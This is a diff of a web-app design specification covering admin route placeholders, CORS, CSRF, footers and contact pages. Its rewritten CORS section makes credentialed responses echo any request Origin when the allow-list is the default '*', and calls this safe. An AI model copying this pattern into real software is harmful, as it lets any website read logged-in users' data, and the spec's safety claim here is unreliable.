 | `<span>` | Inline styling hook | Status badges, icons |
 | `<div>` | Block-level container | Sections, wrappers |
 | `<time>` | Dates and times | Timestamps, durations |
@@ -22106,7 +23510,7 @@ if ('serviceWorker' in navigator) {
 ```javascript
 // /sw.js - Service Worker
 const CACHE_VERSION = 'v1.0.0';
-const CACHE_NAME = `{appname}-cache-${CACHE_VERSION}`;
+const CACHE_NAME = `weather-cache-${CACHE_VERSION}`;
 
 // Assets to pre-cache on install
 const PRECACHE_ASSETS = [
@@ -22133,7 +23537,7 @@ self.addEventListener('activate', event => {
     caches.keys()
       .then(keys => Promise.all(
         keys
-          .filter(key => key.startsWith('{appname}-cache-') && key !== CACHE_NAME)
+          .filter(key => key.startsWith('weather-cache-') && key !== CACHE_NAME)
           .map(key => caches.delete(key))
       ))
       .then(() => self.clients.claim()) // Take control immediately
@@ -22201,7 +23605,7 @@ self.addEventListener('fetch', event => {
 | **New feature** | Increment minor | `v1.0.1` → `v1.1.0` |
 | **Breaking change** | Increment major | `v1.1.0` → `v2.0.0` |
 
-**Cache naming convention:** `{appname}-cache-v{major}.{minor}.{patch}`
+**Cache naming convention:** `weather-cache-v{major}.{minor}.{patch}`
 
 **Update flow:**
 ```
@@ -22407,7 +23811,7 @@ self.addEventListener('notificationclick', event => {
 });
 ```
 
-**Admin Panel Settings (`/admin/server/notifications`):**
+**Admin Panel Settings (`/{admin_path}/server/notifications`):**
 - Enable/disable push notifications
 - VAPID key generation
 - Test push functionality
@@ -23256,7 +24660,7 @@ ERROR: VALIDATION_FAILED: email must be valid
 
 | Source | Content-Type | Format |
 |--------|--------------|--------|
-| API routes (`/api/v1/*`) | `application/json` | JSON |
+| API routes (`/api/{api_version}/*`) | `application/json` | JSON |
 | `.txt` suffix (API only) | `text/plain` | Text |
 | `Accept: application/json` | `application/json` | JSON |
 | `Accept: text/plain` | `text/plain` | Text |
@@ -23265,7 +24669,7 @@ ERROR: VALIDATION_FAILED: email must be valid
 | Frontend AJAX/fetch | Auto-detect from `Accept` | JSON/Text |
 
 **Notes:**
-- `.txt` suffix only works on API routes (`/api/v1/*.txt`)
+- `.txt` suffix only works on API routes (`/api/{api_version}/*.txt`)
 - No `.json` suffix exists - JSON is the default for API
 - Frontend uses `Accept` header for format negotiation (set by fetch/XMLHttpRequest)
 
@@ -23520,7 +24924,7 @@ src/server/template/
 | Layout | Routes | Design Philosophy |
 |--------|--------|-------------------|
 | `public.tmpl` | `/`, `/auth/*`, `/server/*`, `/users/*` | Clean, marketing-friendly, top navigation |
-| `admin.tmpl` | `/admin/*` | Dashboard-style, sidebar navigation, data-dense |
+| `admin.tmpl` | `/{admin_path}/*` | Dashboard-style, sidebar navigation, data-dense |
 
 ### Public Layout (`public.tmpl`)
 
@@ -23537,7 +24941,7 @@ src/server/template/
 │                                                                 │
 │                                                                 │
 ├─────────────────────────────────────────────────────────────────┤
-│        About · Privacy · Contact · GitHub · 1.0.0    │  ← Footer (centered)
+│        About · Privacy · Contact · GitHub · {project_version}    │  ← Footer (centered)
 └─────────────────────────────────────────────────────────────────┘
 ```
 
@@ -23555,7 +24959,7 @@ src/server/template/
 | **App-focused** | Navigation reflects the application's features and purpose |
 | **NO admin links** | NEVER link to `/admin` from public pages |
 | **NO admin hints** | Do not advertise that an admin panel exists |
-| **Direct access only** | Admin panel accessed by navigating directly to `wthr.top/admin` |
+| **Direct access only** | Admin panel accessed by navigating directly to `{fqdn}/admin` |
 
 **Public nav contains (project-specific):**
 - Home (`/`)
@@ -23588,7 +24992,7 @@ src/server/template/
 │              │                                                  │
 │  Sidebar     │                                                  │
 ├──────────────┴──────────────────────────────────────────────────┤
-│                    1.0.0 · Docs · Status             │  ← Footer
+│                    {project_version} · Docs · Status             │  ← Footer
 └─────────────────────────────────────────────────────────────────┘
 ```
 
@@ -23924,7 +25328,7 @@ partial/
   - If logged out: Login link
 
 **Nav does NOT contain:**
-- API link (users access via /openapi if needed)
+- API link (users access via /server/docs/swagger if needed)
 - Admin link (don't advertise - admins know where it is)
 - Help link (belongs in footer)
 
@@ -24625,7 +26029,7 @@ server:
 - Tags with invalid characters (potential XSS)
 - Tags exceeding max length
 
-**Admin Panel (/admin/server/seo):**
+**Admin Panel (/{admin_path}/server/seo):**
 
 | Element | Type | Description |
 |---------|------|-------------|
@@ -24673,11 +26077,14 @@ server:
 | Homepage (`/`) | Always | 1.0 | daily |
 | Public pages | Always | 0.8 | weekly |
 | Documentation (`/docs`) | Always | 0.8 | weekly |
-| API docs (`/openapi`, `/graphql`) | Always | 0.7 | weekly |
+| API docs (`/server/docs/swagger`, `/server/docs/graphql`) | Always | 0.7 | weekly |
 | User profiles (if public) | Dynamic | 0.6 | weekly |
 | Admin pages (`/admin/*`) | **NEVER** | - | - |
 | Auth pages (`/auth/*`) | **NEVER** | - | - |
 | API endpoints (`/api/*`) | **NEVER** | - | - |
+| Security policy (`/server/security/policy`) | Always | 0.5 | yearly |
+| Security thanks (`/server/security/thanks`) | Always | 0.4 | monthly |
+| Researcher status (`/server/security/report/{tracking_id}`) | **NEVER** | - | - (per-researcher private URL — token-bearing) |
 
 **Dynamic Content:**
 - User profiles: Include only if `privacy.profile_public: true`
@@ -24700,7 +26107,7 @@ server:
 - Split into multiple sitemap files: `/sitemap-1.xml`, `/sitemap-2.xml`, etc.
 - Each sitemap file max 50,000 URLs
 
-### Admin Panel (/admin/server/branding)
+### Admin Panel (/{admin_path}/server/branding)
 
 | Element | Type | Description |
 |---------|------|-------------|
@@ -24967,7 +26374,7 @@ messages:
     # User can dismiss
 ```
 
-### Admin Panel (/admin/server/announcements)
+### Admin Panel (/{admin_path}/server/announcements)
 
 | Element | Type | Description |
 |---------|------|-------------|
@@ -24982,81 +26389,175 @@ messages:
 | Dismissible | Toggle | Allow users to dismiss |
 | Delete | Button | Remove announcement |
 
-## CORS 
+## CORS
 
-**Default CORS policy allows all origins (`*`).**
+**Goal: zero-config "just works" for both public APIs and authenticated apps. The operator should never have to touch CORS for typical deployments.**
 
 ### Configuration
 
 ```yaml
 web:
-  # CORS origin configuration
-  # - "*": Allow all origins (default)
+  # CORS allow-list source (see "CORS Allow-list Resolution Order" below).
+  # - "*": explicit allow-all (default — public-API friendly)
   # - "https://example.com": Single origin
-  # - "https://example.com,https://app.example.com": Multiple origins (comma-separated)
-  # - "": Disable CORS headers entirely
+  # - "https://a.com,https://b.com": comma-separated list
+  # - "": Disable CORS headers entirely (same-origin only)
   cors: "*"
 ```
+
+### CORS Allow-list Resolution Order
+
+**The CORS allow-list is the first non-empty source from this list — explicit config wins, with sensible auto-detection beneath:**
+
+| Priority | Source | Behavior |
+|----------|--------|----------|
+| 1 | `web.cors` in `server.yml` | Used verbatim. `"*"` → allow-all. `""` → CORS disabled entirely. Specific origins → those exact origins. |
+| 2 | `DOMAIN` env var (comma-separated list) | Each domain becomes an allowed origin (with both `http://` and `https://` schemes if SSL is enabled). See PART 12 → "DOMAIN Environment Variable". |
+| 3 | Learned reverse-proxy hosts | Hosts observed via `X-Forwarded-Host` / `X-Real-Host` / `X-Original-Host` over time. See PART 12 → "Domain Learning Algorithm". Live-reloaded when new hosts appear. |
+| 4 | `*` (fallback) | If nothing else is defined, allow all origins. Friendly default for public APIs (jokes, weather, IP lookup, etc.). |
+
+**Notes on the resolution order:**
+- Explicit `cors: "*"` and the implicit fallback `*` produce the same on-the-wire behavior, but the explicit form **stops** the resolution chain — DOMAIN and reverse-proxy hosts are NOT added when the operator pinned `*` themselves.
+- Setting `cors: ""` disables CORS entirely (same-origin only) — useful for internal-only deployments.
+- The Admin Panel "CORS Origins" field writes to `web.cors`. The "Allow All" toggle sets it to `"*"`. Leaving the field blank reverts to auto-detection (priority 2 → 3 → 4).
+
+### Per-Response Logic — Credentials-Aware
+
+**The `*` wildcard is incompatible with credentials per W3C CORS. The middleware handles this transparently — never returns `Access-Control-Allow-Origin: *` together with `Access-Control-Allow-Credentials: true`.**
+
+| Response uses credentials? (`Set-Cookie`, `Authorization`, or session in response) | Allow-list contents | What the server sends |
+|---|---|---|
+| No | `*` | `Access-Control-Allow-Origin: *` (no `Allow-Credentials`) |
+| No | specific list | `Access-Control-Allow-Origin: *` (still permissive — no auth means no risk) |
+| Yes | `*` | **Echo** the request `Origin` header + `Access-Control-Allow-Credentials: true`. `*`+credentials is a W3C error, so the wildcard is treated as "any origin OK, but echo it for credentials safety". |
+| Yes | specific list | If request `Origin` is in the list → echo it + `Allow-Credentials: true`. If NOT in the list → **omit** CORS headers (browser blocks the cross-origin response — correct behavior). |
+| Either | `""` (disabled) | No CORS headers at any time. Same-origin only. |
+
+**Why this "just works":**
+
+| Scenario | Outcome | Why |
+|----------|---------|-----|
+| Public API (no auth) called from any frontend | ✓ Works | `*` allows it; no credentials → no W3C conflict. |
+| Auth flow on the app's own domain | ✓ Works | DOMAIN env or reverse-proxy header auto-fills the allow-list with the app's own host; request Origin matches; credentials pass. |
+| Auth flow from a different domain the operator listed | ✓ Works | Origin matches the explicit `web.cors` list; credentials pass. |
+| Auth flow from an unknown domain | ✗ Blocked | Origin not in allow-list → CORS headers omitted → browser blocks. (Correct security posture.) |
+| Operator wants strict same-origin | ✓ Works | Set `cors: ""`. |
+| Operator wants explicit list | ✓ Works | Set `cors: "https://a.com,https://b.com"`. |
+
+**Operator action required:** none, for the typical deployment. Set `web.cors` only if you want stricter-than-default behavior (e.g., locking a public API to a specific frontend).
 
 ### CORS Headers
 
 | Header | Value |
 |--------|-------|
-| `Access-Control-Allow-Origin` | Configured origin(s) or `*` |
+| `Access-Control-Allow-Origin` | `*` (no-credentials path) OR echoed request `Origin` (credentials path or specific list) |
 | `Access-Control-Allow-Methods` | `GET, POST, PUT, PATCH, DELETE, OPTIONS` |
 | `Access-Control-Allow-Headers` | `*` |
-| `Access-Control-Allow-Credentials` | `true` (only when specific origin, not `*`) |
+| `Access-Control-Allow-Credentials` | `true` only when echoing a specific origin (NEVER paired with `*`) |
+| `Access-Control-Expose-Headers` | `Content-Length, Content-Type, X-Request-ID, X-RateLimit-*` |
 | `Access-Control-Max-Age` | `86400` (24 hours) |
+| `Vary` | `Origin` (always — required so caches don't return the wrong CORS headers to a different origin) |
 
-### Behavior
+### Preflight (OPTIONS)
 
-| Scenario | Behavior |
-|----------|----------|
-| `cors: "*"` | Allow all origins, credentials NOT allowed |
-| `cors: "https://example.com"` | Allow single origin, credentials allowed |
-| `cors: "https://a.com,https://b.com"` | Allow listed origins, credentials allowed |
-| `cors: ""` | No CORS headers (same-origin only) |
-| Preflight (OPTIONS) | Return CORS headers, 204 No Content |
+`OPTIONS` requests return `204 No Content` with the CORS headers above. The middleware short-circuits before route handlers run.
 
 ### Mode-Specific Behavior
 
 | Mode | Default | Behavior |
 |------|---------|----------|
-| Production | `*` | Allow all origins by default (configure if needed) |
-| Development | `*` | Allow all origins |
+| Production | priority chain (1→2→3→4) | "Just works" with credentials-aware echoing. Operator can pin via `web.cors`. |
+| Development | priority chain (1→2→3→4) | Same as production. No special dev-mode laxity needed. |
 
-### Admin Panel (/admin/server/web)
+**Note:** there is no mode-specific override. The same resolution order and credentials-aware logic apply in both production and development — what changes is what the operator has actually configured.
+
+### Admin Panel (`/{admin_path}/server/web`)
 
 | Element | Type | Description |
 |---------|------|-------------|
-| CORS Origins | Text input | Comma-separated list of allowed origins |
-| Allow All | Toggle | Quick toggle for `*` (all origins) |
-| Preview | Read-only | Shows resulting CORS headers |
+| CORS Origins | Text input | Comma-separated list of allowed origins. Empty input → revert to auto-detection (DOMAIN → reverse-proxy → `*`). |
+| Allow All | Toggle | Quick toggle for `*` (pins explicit allow-all, stops the resolution chain). |
+| Disable CORS | Toggle | Sets `web.cors: ""` — same-origin only. |
+| Auto-detected origins | Read-only | Shows the current effective allow-list, separating explicit / DOMAIN / learned-reverse-proxy entries. |
+| Preview | Read-only | Shows the resulting CORS headers for both the no-credentials and with-credentials response paths. |
 
-## CSRF Protection 
+## CSRF Protection
 
-**ALL forms MUST have CSRF protection.**
+**CSRF protects cookie-authenticated browser forms from cross-site forgery. It does NOT apply to Bearer/API-token requests, public endpoints, read-only methods, or callers that don't carry browser cookies — applying it there breaks legitimate clients (CLI tools, agents, webhooks, OAuth callbacks) without adding security value.**
+
+### When CSRF Validation Runs
+
+**Validate the CSRF token if and only if ALL of these are true:**
+
+| Condition | Reason |
+|-----------|--------|
+| Method is `POST`, `PUT`, `PATCH`, or `DELETE` | Read-only methods (`GET`, `HEAD`, `OPTIONS`) cannot change state |
+| The request authenticates via session cookie (no `Authorization` / `X-API-Token` / similar bearer header) | Bearer credentials are not auto-attached by browsers, so cross-site forgery has no vector |
+| `Origin` (or `Referer` if `Origin` absent) indicates a cross-site or unknown source | Same-origin requests are inherently CSRF-safe under the browser's same-origin policy |
+
+**Bypass the CSRF check (no validation, no token needed) if ANY of these are true:**
+
+| Bypass | Reason |
+|--------|--------|
+| `Authorization: Bearer …` or `X-API-Token: …` header present | Bearer auth — caller proves possession of a credential the browser cannot auto-attach. CSRF protects against forgery of *cookie* auth; this is a different auth model. |
+| Endpoint is public (no auth required) | Nothing to forge — the endpoint is open to anyone with no session to abuse. |
+| Method is `GET`, `HEAD`, or `OPTIONS` | Safe per RFC 9110. Must remain side-effect-free; if a `GET` mutates, that is a separate spec violation, not a CSRF problem. |
+| `Origin` matches the app's own host AND session cookie is `SameSite=Strict` | The browser already blocked cross-site cookie attachment; the token is redundant. (Same-origin + Lax SameSite cookie still gets the token check on cross-site POST forms.) |
+| WebSocket upgrade request (`Upgrade: websocket`) | Auth happens at the connection level, then per-message; CSRF tokens don't fit the WS lifecycle. |
+| Endpoint is in the explicit `web.csrf.exempt_paths` allow-list | Operator-declared exception. Used for OAuth callbacks, webhook receivers, and other endpoints that are POST'd to from origins the operator has whitelisted but cannot supply a token. |
+
+**Why these bypasses are safe:** CSRF is a defense against *the browser auto-attaching cookies to a cross-site request*. If cookies aren't the auth (Bearer), or the browser already blocked the attachment (SameSite=Strict + same-origin), or there is no auth at all (public endpoint), there is no auto-attached credential to forge. Adding CSRF on top of those situations breaks legitimate non-browser clients without adding any defense.
+
+### Cookie Posture (the first line of defense)
+
+| Cookie | `SameSite` | Why |
+|--------|------------|-----|
+| Session cookie (default) | `Strict` | Most browser auth is same-origin; `Strict` blocks cross-site cookie attachment entirely, neutralizing most CSRF before the token is even checked. |
+| OAuth-callback cookie (state, PKCE-verifier) | `Lax` | OAuth providers redirect cross-site back to our callback; `Strict` would drop the cookie. CSRF token is the second layer here. |
+| Pre-login cookies (e.g., 2FA continuation) | `Strict` | Set after first auth step; never crosses sites. |
+
+**Modern browsers default to `SameSite=Lax` if unset.** Always set `SameSite` explicitly — never rely on the default.
 
 ### Configuration
 
 ```yaml
 web:
   csrf:
-    enabled: true
-    # Token length in bytes
-    token_length: 32
+    enabled: true                # default: true. Set false ONLY for API-only deployments (no browser forms at all).
+    token_length: 32             # bytes
     cookie_name: csrf_token
     header_name: X-CSRF-Token
-    # Secure cookie: auto, true, false
-    secure: auto
+    secure: auto                 # auto | true | false. "auto" sets Secure when proto is https.
+    # Endpoints exempt from CSRF (operator-declared). Glob patterns supported.
+    # Common exemptions: OAuth callbacks, webhook receivers.
+    exempt_paths:
+      - /api/{api_version}/auth/oidc/*/callback
+      - /api/{api_version}/webhooks/*
 ```
 
-### Implementation
+### Implementation Rules
 
-- All forms include hidden CSRF token field
-- All non-GET requests validate CSRF token
-- Token stored in cookie and must match form/header value
-- Tokens regenerated on login
+| Rule | Detail |
+|------|--------|
+| Token in cookie + matching value in form/header | Double-submit cookie pattern. Token cookie is `SameSite=Strict`, `HttpOnly=false` (the form needs to read it), `Secure` per `csrf.secure`. |
+| Forms include hidden `<input name="csrf_token" value="…">` | Server-rendered HTML inserts the token automatically — no manual work in templates. |
+| Non-GET requests under cookie-session auth check the token | Per the "When CSRF Validation Runs" table above — Bearer/public/read-only paths skip the check. |
+| Token regenerated on login, logout, and privilege change | Prevents fixation. |
+| Validation failure → `403 FORBIDDEN` with canonical error body | `{"ok": false, "error": "CSRF_FAILED", "message": "CSRF token validation failed"}` (PART 16 → "Error Response"). |
+| Reject if cookie present and header/form missing, or if values mismatch | No silent fallback. |
+| Log to `security.log` as `security.csrf_failure` | IP, endpoint, reason — see PART 11. |
+
+### Threat Model — What CSRF Stops, What It Doesn't
+
+| Attack | CSRF token stops it? |
+|--------|---------------------|
+| Attacker page POSTs to `https://ourapp.com/transfer` while user is logged in | ✓ Yes (token absent in attacker's POST) |
+| Attacker steals user's session cookie via XSS and replays it | ✗ No (CSRF can't help once the cookie is exfiltrated — that's an XSS / CSP problem) |
+| Attacker uses the user's API token from a leaked config file | ✗ No (API tokens aren't covered by CSRF — that's a token rotation / scope problem) |
+| Attacker phishes the user into pasting a `curl` command | ✗ No (out of band of CSRF; that's social engineering) |
+| Attacker MITMs an HTTP connection | ✗ No (TLS / HSTS problem) |
+
+**Operator action required:** none for typical deployments. Add to `csrf.exempt_paths` only when integrating an OAuth provider, webhook receiver, or other server-to-server POST that cannot present a token. Never disable CSRF wholesale (`enabled: false`) unless the deployment serves zero browser HTML forms.
 
 ## Footer Customization 
 
@@ -25202,11 +26703,11 @@ When admin edits `custom_html`, show:
 
 | Variable | Description |
 |----------|-------------|
-| `{currentyear}` | Current year (e.g., 2025) |
+| `{current_year}` | Current year (e.g., 2025) |
 | `weather` | Project name |
 | `apimgr` | Organization name |
-| `1.0.0` | Application version |
-| `{builddatetime}` | Build date/time |
+| `{project_version}` | Application version |
+| `{build_datetime}` | Build date/time |
 
 ### Default Application Footer (Always Shown)
 
@@ -25236,12 +26737,12 @@ When admin edits `custom_html`, show:
   <p>
     <a href="https://github.com/apimgr/weather" target="_blank">Made with</a> ❤️
     <span>•</span>
-    <span>1.0.0</span>
+    <span>{project_version}</span>
   </p>
 
   <br />
 
-  <a href="/healthz">Last update: {builddatetime}</a>
+  <a href="/healthz">Last update: {build_datetime}</a>
 </footer>
 ```
 
@@ -25254,7 +26755,7 @@ When admin edits `custom_html`, show:
   <div class="admin-footer-content">
     <!-- Version info -->
     <span class="admin-footer-version">
-      <a href="/admin/server/info">weather 1.0.0</a>
+      <a href="/{admin_path}/server/info">weather {project_version}</a>
     </span>
 
     <span class="admin-footer-separator">•</span>
@@ -25333,7 +26834,7 @@ When admin edits `custom_html`, show:
 
 | Element | Description |
 |---------|-------------|
-| Version | Links to `/admin/server/info` - shows project name and version |
+| Version | Links to `/{admin_path}/server/info` - shows project name and version |
 | Docs | External link to ReadTheDocs documentation |
 | Status | Server health indicator (green/yellow/red) with status text |
 
@@ -25346,7 +26847,7 @@ When admin edits `custom_html`, show:
 | **Status indicator** | Real-time server health from `/healthz` |
 | **Same position rules** | Bottom of page, scrolls with content, centered |
 
-### Admin Panel (/admin/server/footer)
+### Admin Panel (/{admin_path}/server/footer)
 
 | Element | Type | Description |
 |---------|------|-------------|
@@ -25355,8 +26856,8 @@ When admin edits `custom_html`, show:
 | Rendered preview | Preview pane | Shows rendered footer |
 
 **Related admin pages:**
-- Analytics tracking: `/admin/server/tracking` (PART 12: Analytics Tracking)
-- Privacy & consent: `/admin/server/privacy` (PART 12: Privacy & Consent)
+- Analytics tracking: `/{admin_path}/server/tracking` (PART 12: Analytics Tracking)
+- Privacy & consent: `/{admin_path}/server/privacy` (PART 12: Privacy & Consent)
 
 ## Cookie Consent Banner 
 
@@ -25364,7 +26865,7 @@ When admin edits `custom_html`, show:
 
 **Configuration:** `server.privacy.consent` (see PART 12: Privacy & Consent)
 
-**Admin panel:** `/admin/server/privacy`
+**Admin panel:** `/{admin_path}/server/privacy`
 
 ### Banner Layout
 
@@ -25875,7 +27376,7 @@ func trackingScript(r *http.Request) template.HTML {
 ```html
 <article class="privacy-policy">
   <h1>Privacy Policy</h1>
-  <p class="last-updated">Last updated: {builddatetime}</p>
+  <p class="last-updated">Last updated: {build_datetime}</p>
 
   <!-- Summary - Key Points (always shown first) -->
   <!-- Dynamic: Second key-point changes based on server.privacy.data.sold -->
@@ -26064,7 +27565,7 @@ func trackingScript(r *http.Request) template.HTML {
 </article>
 ```
 
-**API Endpoint (`/api/v1/server/privacy`):**
+**API Endpoint (`/api/{api_version}/server/privacy`):**
 
 ```json
 {
@@ -26143,7 +27644,7 @@ func trackingScript(r *http.Request) template.HTML {
 
 **Note:** The `tracking` and `third_party.services` fields are populated based on `server.tracking` config. If no tracking is configured, they remain empty.
 
-**Admin Panel (`/admin/server/privacy`):**
+**Admin Panel (`/{admin_path}/server/privacy`):**
 
 | Tab | Fields |
 |-----|--------|
@@ -26176,7 +27677,7 @@ func trackingScript(r *http.Request) template.HTML {
 | Message | Textarea | Yes | Message body |
 | Captcha | Captcha | Yes | Spam prevention |
 
-**Submission sends email to `server.contact` address (or admin email if not set).**
+**Submission routes through `server.contact.general` (PART 12 → "Contact Configuration") — `general.email` if set, else falls back to `server.contact.admin.email`. Webhooks under `general.webhooks.*` (Telegram, Discord, Slack, etc.) fire in parallel with the email.**
 
 ### /server/help
 
@@ -26186,7 +27687,7 @@ func trackingScript(r *http.Request) template.HTML {
 |---------|-------------|
 | Getting started | Quick start guide |
 | Features | How to use key features |
-| API Documentation | Links to Swagger (/openapi) and GraphQL (/graphql) - both in sync |
+| API Documentation | Links to Swagger (/server/docs/swagger) and GraphQL (/server/docs/graphql) - both in sync |
 | Tor Access | How to access via Tor (only shown if Tor enabled) |
 | FAQ | Frequently asked questions |
 | Troubleshooting | Common issues and solutions |
@@ -26274,8 +27775,8 @@ curl -H "Accept: application/xml" https://jokes.example.com/api/v1/joke</code></
   <h3>API Documentation</h3>
   <p>This application provides a full REST API with interactive documentation.</p>
   <ul>
-    <li><a href="/openapi">Swagger UI</a> - Interactive REST API explorer</li>
-    <li><a href="/graphql">GraphiQL</a> - Interactive GraphQL explorer</li>
+    <li><a href="/server/docs/swagger">Swagger UI</a> - Interactive REST API explorer</li>
+    <li><a href="/server/docs/graphql">GraphiQL</a> - Interactive GraphQL explorer</li>
   </ul>
 </div>
 ```
@@ -26348,7 +27849,9 @@ server:
     contact:
       # Enable contact form
       enabled: true
-      # Recipient email (if empty, uses server.contact or admin email)
+      # Per-page recipient override. Empty = use server.contact.general (PART 12).
+      # Set this only if THIS contact page should bypass the global routing
+      # (rare — operators usually configure server.contact.general directly).
       recipient: ""
       # Captcha type: recaptcha, hcaptcha, simple (built-in)
       captcha: simple
@@ -26366,7 +27869,7 @@ server:
       content: ""
 ```
 
-### Admin Panel (/admin/server/pages)
+### Admin Panel (/{admin_path}/server/pages)
 
 | Element | Type | Description |
 |---------|------|-------------|
@@ -26395,11 +27898,11 @@ server:
 
 | Route | Method | Description |
 |-------|--------|-------------|
-| `/api/v1/server/about` | GET | About information (JSON) |
-| `/api/v1/server/privacy` | GET | Privacy policy (JSON) |
-| `/api/v1/server/contact` | POST | Submit contact form |
-| `/api/v1/server/help` | GET | Help content (JSON) |
-| `/api/v1/server/terms` | GET | Terms of service (JSON) |
+| `/api/{api_version}/server/about` | GET | About information (JSON) |
+| `/api/{api_version}/server/privacy` | GET | Privacy policy (JSON) |
+| `/api/{api_version}/server/contact` | POST | Submit contact form |
+| `/api/{api_version}/server/help` | GET | Help content (JSON) |
+| `/api/{api_version}/server/terms` | GET | Terms of service (JSON) |
 
 ### /server/ Frontend Routes
 
@@ -26433,9 +27936,9 @@ server:
 
 | Rule | Description |
 |------|-------------|
-| **NEVER link to admin path** | No links to `/admin` on ANY public routes (`/**`) |
+| **NEVER link to admin path** | No links to `/{admin_path}` on ANY public routes (`/**`) |
 | **Intentional access only** | Users must manually type admin path in browser |
-| **Separate authentication** | Admin account is ONLY valid for `/admin/**` routes |
+| **Separate authentication** | Admin account is ONLY valid for `/{admin_path}/**` routes |
 | **No admin mentions** | Don't advertise admin panel existence anywhere |
 | **Separate session** | Admin session is separate from user sessions |
 
@@ -26443,9 +27946,9 @@ server:
 
 | User Type | Valid Routes | Authentication |
 |-----------|--------------|----------------|
-| **Admin** | `/admin/**` ONLY | Admin credentials (username/password) |
-| **Guest/Anon** | `/**` (except `/admin`) | None |
-| **Normal User** | `/**` (except `/admin`) | User account (if multi-user enabled) |
+| **Admin** | `/{admin_path}/**` ONLY | Admin credentials (username/password) |
+| **Guest/Anon** | `/**` (except `/{admin_path}`) | None |
+| **Normal User** | `/**` (except `/{admin_path}`) | User account (if multi-user enabled) |
 
 **Admin credentials are stored in `users.db` (admins table), NOT in config file.**
 
@@ -26481,85 +27984,85 @@ server:
 ### Route Structure
 
 ```
-/admin/                          # Admin root (dashboard)
-/admin/profile                   # Admin's own profile/preferences
-/admin/preferences               # Admin's own preferences/settings
-/admin/notifications             # Admin's own notifications
-/admin/server/                   # Server management (EVERYTHING ELSE)
-/admin/server/settings           # Server settings
-/admin/server/ssl                # SSL/TLS configuration
-/admin/server/email              # Email configuration
-/admin/server/scheduler          # Scheduled tasks
-/admin/server/logs               # Server logs
-/admin/server/logs/audit         # Audit logs
-/admin/server/backup             # Backup/restore
-/admin/server/updates            # Update management
-/admin/server/info               # Server information
-/admin/server/metrics            # Metrics dashboard
-/admin/server/network/           # Network settings
-/admin/server/network/tor        # Tor configuration
-/admin/server/network/geoip      # GeoIP settings
-/admin/server/security/          # Security settings
-/admin/server/security/auth      # Authentication config
-/admin/server/security/tokens    # API token management
-/admin/server/security/firewall  # Firewall rules
-/admin/server/users/             # User management (if multi-user)
-/admin/server/orgs/              # Org management (if orgs enabled)
-/admin/server/cluster/           # Cluster management (if clustering)
-/admin/server/agents/            # Agent management (if agents)
+/{admin_path}/                          # Admin root (dashboard)
+/{admin_path}/profile                   # Admin's own profile/preferences
+/{admin_path}/preferences               # Admin's own preferences/settings
+/{admin_path}/notifications             # Admin's own notifications
+/{admin_path}/server/                   # Server management (EVERYTHING ELSE)
+/{admin_path}/server/settings           # Server settings
+/{admin_path}/server/ssl                # SSL/TLS configuration
+/{admin_path}/server/email              # Email configuration
+/{admin_path}/server/scheduler          # Scheduled tasks
+/{admin_path}/server/logs               # Server logs
+/{admin_path}/server/logs/audit         # Audit logs
+/{admin_path}/server/backup             # Backup/restore
+/{admin_path}/server/updates            # Update management
+/{admin_path}/server/info               # Server information
+/{admin_path}/server/metrics            # Metrics dashboard
+/{admin_path}/server/network/           # Network settings
+/{admin_path}/server/network/tor        # Tor configuration
+/{admin_path}/server/network/geoip      # GeoIP settings
+/{admin_path}/server/security/          # Security settings
+/{admin_path}/server/security/auth      # Authentication config
+/{admin_path}/server/security/tokens    # API token management
+/{admin_path}/server/security/firewall  # Firewall rules
+/{admin_path}/server/users/             # User management (if multi-user)
+/{admin_path}/server/orgs/              # Org management (if orgs enabled)
+/{admin_path}/server/cluster/           # Cluster management (if clustering)
+/{admin_path}/server/agents/            # Agent management (if agents)
 ```
 
 ### Route Hierarchy Rules 
 
 | Rule | Description |
 |------|-------------|
-| **`/admin/` root** | Dashboard ONLY |
-| **`/admin/profile`** | Admin's OWN profile (not server management) |
-| **`/admin/preferences`** | Admin's OWN preferences (not server settings) |
-| **`/admin/notifications`** | Admin's OWN notifications |
-| **`/admin/server/*`** | ALL server management goes here |
-| **No other direct children** | ONLY profile/preferences/notifications under `/admin/` |
+| **`/{admin_path}/` root** | Dashboard ONLY |
+| **`/{admin_path}/profile`** | Admin's OWN profile (not server management) |
+| **`/{admin_path}/preferences`** | Admin's OWN preferences (not server settings) |
+| **`/{admin_path}/notifications`** | Admin's OWN notifications |
+| **`/{admin_path}/server/*`** | ALL server management goes here |
+| **No other direct children** | ONLY profile/preferences/notifications under `/{admin_path}/` |
 
 ### What Goes Where
 
 | Route | Purpose | Example |
 |-------|---------|---------|
-| `/admin/` | Dashboard overview | System status, quick stats |
-| `/admin/profile` | Admin's personal account | Change own password, 2FA |
-| `/admin/preferences` | Admin's UI preferences | Theme, language, timezone |
-| `/admin/server/*` | **EVERYTHING server-related** | Config, users, logs, etc. |
+| `/{admin_path}/` | Dashboard overview | System status, quick stats |
+| `/{admin_path}/profile` | Admin's personal account | Change own password, 2FA |
+| `/{admin_path}/preferences` | Admin's UI preferences | Theme, language, timezone |
+| `/{admin_path}/server/*` | **EVERYTHING server-related** | Config, users, logs, etc. |
 
 ### INVALID Routes (NEVER DO THIS)
 
 ```
 # WRONG - Server management at admin root level
-/admin/settings          # ✗ WRONG - use /admin/server/settings
-/admin/users             # ✗ WRONG - use /admin/server/users
-/admin/logs              # ✗ WRONG - use /admin/server/logs
-/admin/security          # ✗ WRONG - use /admin/server/security
-/admin/email             # ✗ WRONG - use /admin/server/email
-/admin/tor               # ✗ WRONG - use /admin/server/network/tor
-/admin/tokens            # ✗ WRONG - use /admin/server/security/tokens
-/admin/agents            # ✗ WRONG - use /admin/server/agents
-/admin/cluster           # ✗ WRONG - use /admin/server/cluster
+/{admin_path}/settings          # ✗ WRONG - use /{admin_path}/server/settings
+/{admin_path}/users             # ✗ WRONG - use /{admin_path}/server/users
+/{admin_path}/logs              # ✗ WRONG - use /{admin_path}/server/logs
+/{admin_path}/security          # ✗ WRONG - use /{admin_path}/server/security
+/{admin_path}/email             # ✗ WRONG - use /{admin_path}/server/email
+/{admin_path}/tor               # ✗ WRONG - use /{admin_path}/server/network/tor
+/{admin_path}/tokens            # ✗ WRONG - use /{admin_path}/server/security/tokens
+/{admin_path}/agents            # ✗ WRONG - use /{admin_path}/server/agents
+/{admin_path}/cluster           # ✗ WRONG - use /{admin_path}/server/cluster
 
 # CORRECT
-/admin/profile           # ✓ Admin's own profile
-/admin/preferences       # ✓ Admin's own preferences
-/admin/server/settings   # ✓ Server settings
-/admin/server/users      # ✓ User management
+/{admin_path}/profile           # ✓ Admin's own profile
+/{admin_path}/preferences       # ✓ Admin's own preferences
